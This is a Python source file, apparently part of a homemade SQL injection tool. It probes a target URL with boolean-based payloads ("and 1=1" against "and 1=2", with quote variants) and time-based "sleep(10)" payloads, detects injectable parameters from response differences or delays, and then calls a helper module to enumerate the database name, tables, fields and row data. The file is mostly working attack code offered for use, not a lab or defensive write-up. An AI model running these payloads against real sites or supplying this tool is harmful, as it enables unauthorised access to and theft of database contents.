import threading
import time

import requests
from colorama import Fore

from database_length_checker import DatabaseLengthChecker
from spiner import spinner


class checkforSQLi:
    def __init__(self, url):
        self.url = url
        self.method = None
        self.pre_payload = ''


    def hasSQLi(self):
        default_request = self.url
        test1 = [
            f"{self.url} and 1=1",
            f"{self.url}' and '1'='1",
            f'{self.url}" and "1"="1'
        ]
        test2 = [
            f"{self.url} and 1=2",
            f"{self.url}' and '1'='2",
            f'{self.url}" and "1"="2'
        ]
        time_based_tests = [
            f"{self.url} and sleep(10)",
            f"{self.url}' and sleep(10)#",
            f'{self.url}" and sleep(10)#'
        ]
        for t1, t2 in zip(test1, test2):
            default_response = requests.get(default_request).text
            try:
                response1 = requests.get(t1)
                response2 = requests.get(t2)
                print("==================================================")
                print('Default  ', '<==>', Fore.GREEN + default_response)
                print(t1, '<==>', Fore.GREEN + response1.text)
                print(t2, '<==>', Fore.GREEN + response2.text)
                print("==================================================", )
                print((default_response == response1) and (response1 != response2))

                if default_response == response1.text and response1.text != response2.text:
                    print(Fore.RED + f"Potential SQL Injection found with: {t1}")
                    self.detect_and_set_pre_payload(t1)

                    self.set_method("Blind")
                    return True


            except Exception as e:
                print(Fore.YELLOW + f"Error while testing: {e}")
                self.set_method(None)

                return False
        for test in time_based_tests:
            start_time = time.time()
            res = requests.get(test)
            print("Test Time base", res.text)
            elapsed_time = time.time() - start_time

            if elapsed_time > 8:  # Check if the response time is significantly delayed (e.g., 10 seconds)
                print(Fore.RED + f"Potential Time-based SQL Injection found with: {test}")
                self.detect_and_set_pre_payload(test)

                self.set_method("Time-Based")
                return True
        print(Fore.GREEN + "No SQL Injection vulnerabilities detected.")
        self.set_method(None)
        return False

    def set_method(self, method):
        self.method = method

    def set_pre_payload(self, payload):
        self.pre_payload = payload

    def get_pre_payload(self):
        return self.pre_payload

    def get_method(self):
        return self.method

    def get_database_length(self):
        databaseLenght = DatabaseLengthChecker(self.url, self.pre_payload)


        return databaseLenght.get_database_length(),databaseLenght.get_number_of_tables(),databaseLenght.extract_table_names()
    def get_database_name(self):
        databaseLenght = DatabaseLengthChecker(self.url, self.pre_payload)
        return databaseLenght.get_extract_database_name()
    def extract_fields_for_table(self,table_name):
        databaseLenght = DatabaseLengthChecker(self.url, self.pre_payload)
        return databaseLenght.extract_fields_for_table(table_name)
    def extract_fields_for_row(self,table_name,fild):
        databaseLenght = DatabaseLengthChecker(self.url, self.pre_payload)
        return databaseLenght.extract_data(table_name,fild)




    def detect_and_set_pre_payload(self, test_payload):
        # Detect the type of quotes used in the payload
        if "'" in test_payload and '"' not in test_payload:
            self.set_pre_payload("'")
        elif '"' in test_payload and "'" not in test_payload:
            self.set_pre_payload('"')
        else:
            self.set_pre_payload('')

